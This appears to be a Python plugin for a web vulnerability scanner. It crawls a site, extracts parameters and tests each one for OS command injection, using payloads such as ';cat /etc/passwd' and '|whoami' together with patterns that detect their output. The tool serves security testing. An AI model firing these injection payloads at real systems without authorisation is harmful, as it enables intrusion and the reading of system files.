"""
OS Command Injection Plugin (자동화 버전)
- 내부 링크 자동 크롤링
- 파라미터 추출 및 취약점 테스트
- DVWA Adapter 인증 세션 공유 가능
"""

from __future__ import annotations
import re
import urllib.parse
from typing import List, Dict
import logging

from s2n.s2nscanner.http.client import HttpClient
from s2n.s2nscanner.crawler import crawl_recursive
from s2n.s2nscanner.interfaces import Finding, Severity

logger = logging.getLogger("s2n.plugin.oscommand")

# ------------------------------
# 전역 설정
# ------------------------------
PAYLOADS = [
    ";id", "&&id", "|id",
    ";whoami", "|whoami",
    ";cat /etc/passwd", "|uname -a",
    "&echo vulnerable"
]

PATTERNS = [
    r"uid=\d+", r"gid=\d+",
    r"root:.*:0:0:",
    r"administrator",
    r"vulnerable",
    r"linux", r"ubuntu",
]

COMMON_PARAMS = ["id", "cmd", "ip", "input", "search", "q", "page", "file"]

# ------------------------------
# 유틸 함수: 파라미터 추출
# ------------------------------
def extract_params(html: str, url: str) -> List[str]:
    params = set()
    parsed = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qs(parsed.query)
    params.update(q.keys())
    for m in re.finditer(r'name=["\']?([a-z0-9_\-]+)["\']?', html, re.I):
        params.add(m.group(1))
    return list(params or COMMON_PARAMS)

# ------------------------------
# 유틸 함수: 테스트 실행
# ------------------------------
def test_os_command_injection(target: str, client: HttpClient, params: List[str], timeout: int = 5) -> List[Dict]:
    findings = []
    try:
        for p in params:
            for payload in PAYLOADS:
                test_val = f"test{payload}"
                parsed = urllib.parse.urlparse(target)
                q = dict(urllib.parse.parse_qsl(parsed.query))
                q[p] = test_val
                new_query = urllib.parse.urlencode(q)
                new_url = parsed._replace(query=new_query).geturl()

                r = client.get(new_url, timeout=timeout)
                text = (r.text or "").lower()

                for pattern in PATTERNS:
                    if re.search(pattern, text):
                        logger.debug("[+] Vulnerable %s param=%s payload=%s", new_url, p, payload)
                        findings.append({
                            "id": f"oscmd-{hash(new_url) & 0xffff:x}",
                            "plugin": "oscommand",
                            "severity": Severity.HIGH,
                            "title": "OS Command Injection",
                            "description": f"Detected OS command injection in parameter '{p}'",
                            "url": new_url,
                            "payload": payload,
                            "evidence": pattern,
                        })
                        # 하나의 param에서 발견되면 break
                        break
    except Exception as e:
        logger.warning("OSCommand test error: %s", e)
    return findings


# ------------------------------
# Plugin 클래스 (Scanner에서 자동 탐지)
# ------------------------------
class Plugin:
    name = "oscommand"
    description = "Detects OS Command Injection vulnerabilities"

    def initialize(self, cfg=None, http: HttpClient | None = None):
        self.http = http or HttpClient()
        self.depth = cfg.get("depth", 2) if isinstance(cfg, dict) else 2
        logger.info("OSCommand Plugin initialized (depth=%d)", self.depth)

    def scan(self, base_url: str, http: HttpClient) -> List[Finding]:
        logger.info("Scanning base URL for OS command injection: %s", base_url)

        # 1️⃣ 내부 링크 크롤링 (공통 모듈 사용)
        targets = crawl_recursive(base_url, http, depth=self.depth)
        logger.debug("Discovered %d URLs from crawl", len(targets))

        findings: List[Finding] = []

        # 2️⃣ 각 페이지별 파라미터 추출 및 테스트
        for t in targets:
            try:
                resp = http.get(t, timeout=5)
                html = resp.text or ""
                params = extract_params(html, t)
                results = test_os_command_injection(t, http, params)
                for r in results:
                    findings.append(Finding(**r))
            except Exception as e:
                logger.debug("Failed to scan %s: %s", t, e)

        logger.info("OSCommand scan finished: %d findings", len(findings))
        return findings

    def teardown(self):
        logger.debug("OSCommand Plugin teardown complete.")
        